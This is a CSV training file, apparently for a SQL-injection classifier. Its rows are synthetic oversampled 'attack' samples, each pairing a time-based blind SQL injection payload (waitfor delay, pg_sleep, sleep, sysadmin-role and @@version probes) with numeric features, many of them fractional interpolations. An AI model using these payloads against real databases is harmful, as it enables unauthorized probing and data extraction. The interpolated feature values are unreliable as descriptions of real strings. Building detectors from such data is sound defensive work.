id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001921,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.7221712563282391,38.093488997793926,23.0,4.167920313983897,16.0,2.0,7.577907498161606,12.515581499632322,0.42265099375282034,0.05283137421910254,0.19495422818584432,0.3295634038422328,2.0,0.0,2.0,0.0,0.0,0.0,0.0,1.5155814996323214,0.0,4.0,1.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001922,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.7313860182642108,38.056402494121954,23.0,4.169303470758815,16.0,2.0,7.547002078434961,12.509400415686992,0.4230645018076995,0.05288306272596244,0.1943296587279539,0.3297227767383842,2.0,0.0,2.0,0.0,0.0,0.0,0.0,1.5094004156869922,0.0,4.0,1.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001923,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.6267464675772366,41.95823862104224,17.0,3.1830327913060747,13.0,1.0,17.465198850868536,10.493039770173707,0.31551710298077495,0.024270546383136537,0.40859877162844394,0.25161357900764453,0.0,0.0,2.0,0.0,0.0,0.0,0.0,3.4930397701737075,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001924,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.268287152314418,34.78644290122222,16.035932870366665,3.326642897845612,12.357288580244443,0.0,12.071865740733333,10.357288580244443,0.3584146694862782,0.0,0.34184276083717624,0.29974256967654556,0.0,0.6786442901222222,2.0,0.0,0.0,0.0,0.0,2.678644290122222,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.678644290122222,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.678644290122222,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6786442901222218
SMOTE_001925,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,1.8852776127442832,28.096102854148278,13.786038570305603,3.0039479393252035,8.786038570305603,1.3689935716157327,11.786038570305603,6.155032141921336,0.3066473529326136,0.059558298334618676,0.4238233193338474,0.20997102939892032,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6310064283842673,0.0,2.5240257135370694,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.6310064283842675,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6310064283842673,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.6310064283842673
SMOTE_001926,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.4898918294253645,36.09952672985078,22.50995267298508,4.1817945571974615,16.0,2.0,6.079621383880625,12.019905345970155,0.45193357381777144,0.05649169672722143,0.15599465730967566,0.3355800721453315,2.0,0.0,2.0,0.0,0.0,0.0,0.0,1.0199053459701561,0.0,4.0,1.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.5099526729850778,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001927,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.1669054978144424,69.60421863100044,27.39578136899957,4.225343481305482,36.20843726200086,3.6042186310004283,16.39578136899957,13.395781368999572,0.5201313703919346,0.05173466452298722,0.2356184674397439,0.19251549764533427,4.0,0.0,2.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,3.3957813689995713,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.3957813689995714,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3957813689995713
SMOTE_001928,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,1.198248120006074,30.680241736954677,15.608145042172804,3.419300680493344,12.07209669478187,0.536048347390935,9.07209669478187,9.0,0.3934372817612456,0.01624388931487682,0.2949965081799296,0.295322320743948,0.0,0.0,2.0,0.0,0.0,0.0,0.0,2.0,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5360483473909351,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5360483473909352
SMOTE_001929,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,4.331848349190444,39.63137229141837,18.0250232936035,3.3369294874868505,12.01251164680175,5.568814057409626,15.062558234008751,6.987488353198249,0.31890878796665423,0.11137628114819251,0.37275894198073795,0.19695598890441532,0.0,0.49374417659912495,0.0,0.0,0.0,0.0,0.0,3.01251164680175,0.0,1.9749767063964998,0.506255823400875,0.0,0.0,0.49374417659912495,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.49374417659912506,0.506255823400875,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001930,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,1.1661067797701594,28.1948451244866,15.597422562243299,3.351644218658838,11.0,0.0,9.597422562243299,7.5974225622433,0.39062158828946025,0.0,0.3402002593361299,0.26917815237440984,0.0,0.5974225622432996,0.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,-5.551115123125783e-17,0.0,0.0,0.5974225622432996,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001931,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,1.2491495306166498,28.137507085740893,15.568753542870446,3.350503607452737,11.0,0.0,9.568753542870446,7.568753542870447,0.39142710352088145,0.0,0.33987073037782123,0.2687021661012973,0.0,0.5687535428704469,0.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,-5.551115123125783e-17,0.0,0.0,0.5687535428704469,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001932,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,1.6142595873493548,114.0932118780969,30.03300802566381,4.016818698278726,55.31845585884904,4.774756019247857,36.4834959871681,17.516504012831906,0.4809420439192542,0.04301034611580735,0.3210157296624721,0.15503188030246634,3.4834959871680953,0.0,2.0,0.0,0.0,0.0,0.25825200641595236,6.0,0.0,0.0,1.2582520064159524,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.25825200641595236,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2582520064159525,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2582520064159524
SMOTE_001933,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,2.574058402987022,39.69850376621273,16.51804579692843,3.1187226694775823,12.03609159385686,1.0,17.108274781570582,9.55413739078529,0.30558403448548577,0.025687252440383834,0.42869430708916434,0.24003440598496603,0.0,0.0,1.0360915938568602,0.0,0.0,0.0,0.0,3.5180457969284302,0.0,4.51804579692843,-5.551115123125783e-17,1.0360915938568602,0.0,0.0,0.5180457969284301,0.4819542030715699,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4819542030715699,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4819542030715698
SMOTE_001934,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.5307355493622582,101.6047502801942,32.66215783574859,4.0647089293666445,40.858131903382755,6.746618376811442,35.168921082125706,18.831078917874294,0.40035528818577326,0.06692677190922562,0.34669965112653556,0.18601828877846552,2.1689210821257054,0.0,2.0,0.0,0.0,0.0,0.9155394589371475,6.0,0.0,0.0,1.9155394589371473,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.9155394589371475,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9155394589371473,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.9155394589371473
SMOTE_001935,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.8328172135938021,27.575030393073177,15.287515196536589,3.3393143998540458,11.0,0.0,9.287515196536589,7.287515196536589,0.3993290749376693,0.0,0.3366381057073171,0.2640328193550136,0.0,0.2875151965365882,0.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,-5.551115123125783e-17,0.0,0.0,0.2875151965365882,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001936,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.6759684927120825,110.83985911216035,28.83679718224321,4.031506207608232,56.75672673832338,3.836797182243207,33.735943644864136,16.510391546729622,0.5117304927559008,0.03522341106300088,0.30039002637789547,0.1526560698032029,4.0,0.0,2.0,0.0,0.0,0.0,0.0,5.347188728972828,0.0,0.16320281775679302,1.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001937,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.0,100.0,33.0,4.070862758735813,39.0,7.0,35.0,19.0,0.39,0.07,0.35,0.19,2.0,0.0,2.0,0.0,0.0,0.0,1.0,6.0,0.0,0.0,1.9999999999999998,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001938,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,1.0910309187841398,38.08983915418936,21.7527882089383,4.026841903546082,15.37639410446915,2.4157372636872334,8.544919577094682,11.7527882089383,0.4092093331673038,0.06943590740993481,0.21629928737035983,0.3050554720524016,2.207868631843617,0.0,2.0,0.0,0.0,0.0,0.0,1.5842627363127668,0.0,3.168525472625533,0.7921313681563831,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.7921313681563833,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001939,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,1.369603887803243,37.346787666662266,21.434337571426685,4.018498009292932,15.217168785713344,2.5218874761911048,8.173393833331133,11.434337571426687,0.41405177736915155,0.07470985654066012,0.2092513735320269,0.3019869925581614,2.260943738095552,0.0,2.0,0.0,0.0,0.0,0.0,1.4781125238088955,0.0,2.956225047617791,0.7390562619044476,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.7390562619044478,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001940,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,2.241698512598804,106.79326688872294,31.927378912306906,4.04823954708015,46.86588797641603,5.927378912306905,35.71508072512873,18.28491927487127,0.43383625117490826,0.056990338068036134,0.33602888499223277,0.1731445257648228,2.71508072512873,0.0,2.0,0.0,0.0,0.0,0.6424596374356351,6.0,0.0,0.0,1.6424596374356348,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.6424596374356351,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6424596374356351,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.6424596374356355
SMOTE_001941,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.6512467063278455,30.16764285716349,16.0,3.3249469668899647,11.0,0.0,10.93411428573079,8.233528571432696,0.3679539598330695,0.0,0.3584552482003166,0.2735907919666139,0.0,1.1167642857163487,0.0,0.0,0.0,0.11676428571634861,0.0,2.1167642857163487,0.0,4.0,-5.551115123125783e-17,0.11676428571634867,0.0,1.0,0.0,0.8832357142836513,0.0,0.11676428571634861,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001942,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.08221161432571075,41.89260541851405,16.026848645371487,3.0796034612075496,13.0,0.0,17.89260541851405,11.0,0.3103985774181186,0.0,0.4269564724588579,0.26264495012302347,0.0,0.02684864537148718,2.0,0.0,0.0,0.0,0.0,3.973151354628513,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.026848645371487095,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001943,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.0,100.0,33.0,4.070862758735813,39.0,7.0,35.0,19.0,0.39,0.07,0.35,0.19,2.0,0.0,2.0,0.0,0.0,0.0,1.0,6.0,0.0,0.0,1.9999999999999998,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001944,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.13944356961393678,44.41672005838178,16.805573352793928,3.073756095472633,13.0,0.8055733527939268,19.611146705587853,11.0,0.2929008673232999,0.017901630062087257,0.44135830718720515,0.24783919542740762,0.0,0.0,2.0,0.0,0.0,0.0,0.0,4.0,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001945,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,2.7447051491095698,108.317583521585,31.68669733869711,4.044857071102538,48.63088618288788,5.6866973386971065,35.875535107535256,18.124464892464736,0.44367250932327507,0.05407114699316099,0.33289395693260937,0.16936238675095455,2.875535107535262,0.0,2.0,0.0,0.0,0.0,0.562232446232369,6.0,0.0,0.0,1.562232446232369,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.562232446232369,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5622324462323688,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.562232446232369
SMOTE_001946,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.3126518918171307,35.52442331173854,16.0,3.0593677822257805,11.0,0.0,15.819538649390832,8.704884662347709,0.31100620234026694,0.0,0.44375653186478514,0.24523726579494792,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.704884662347708,0.0,4.0,-5.551115123125783e-17,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001947,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.46737316642154036,114.47346793487216,29.722865383767683,4.041349791955813,58.78292307014147,4.0,35.06005768637378,16.630487178356912,0.5140799881536173,0.03578705021134589,0.30331675283171794,0.1468162088033188,4.0,0.0,2.0,0.0,0.0,0.0,0.0,5.630487178356912,0.0,0.09237820541077202,1.0,3.907621794589228,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.907621794589228,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.907621794589228
SMOTE_001948,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.2771146563557104,27.451335295015646,17.338501471261736,3.923805387656625,13.169250735630868,3.8871661762460885,3.1128338237539115,7.2820845593847805,0.48010837145696295,0.1430139106651659,0.11290212418657003,0.263975593691301,2.9435830881230443,0.0,2.0,0.0,0.0,0.0,0.0,0.05641691187695619,0.0,0.22566764750782342,0.0564169118769558,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.056416911876955855,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001949,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.1847974053980395,29.33132969171093,16.0,3.355540462650662,11.0,0.0,10.265063753368743,8.066265938342186,0.3760878632990095,0.0,0.3486945640411886,0.2752175726598019,0.0,1.033132969171093,0.0,0.0,0.0,0.033132969171092846,0.0,2.033132969171093,0.0,4.0,-5.551115123125783e-17,0.033132969171092874,0.0,1.0,0.0,0.966867030828907,0.0,0.033132969171092846,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001950,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,2.2001485902095044,28.806766492666444,19.168119791199732,4.073119097137912,14.084059895599866,3.2772934029334224,2.638646701466712,8.806766492666444,0.48817320923209795,0.11719890730154703,0.0935453257657429,0.3010825577006121,2.638646701466711,0.36135329853328874,2.0,0.0,0.0,0.0,0.3613532985332887,0.0,0.0,1.4454131941331545,-5.551115123125783e-17,2.0,1.0,0.36135329853328874,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.3613532985332887,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001951,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,3.4904487995738847,40.50488110582131,17.626220276455328,3.2237742016702473,11.813110138227664,5.06555069113832,16.439330414682992,7.186889861772336,0.2977012073739448,0.10689637787816564,0.406981705069249,0.18842070967864055,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.406555069113832,0.0,2.373779723544672,0.406555069113832,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5934449308861681,0.406555069113832,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001952,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.21434377184538722,45.861170556901094,16.0,2.7687622438397357,11.0,0.0,23.90744703793406,10.95372351896703,0.23990248931955915,0.0,0.5212712185942066,0.2388262920862343,0.046276481032969885,1.9074470379340605,0.0,0.0,0.0,1.0,0.0,4.0,0.0,4.0,-5.551115123125783e-17,1.0,0.046276481032969996,0.9537235189670302,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
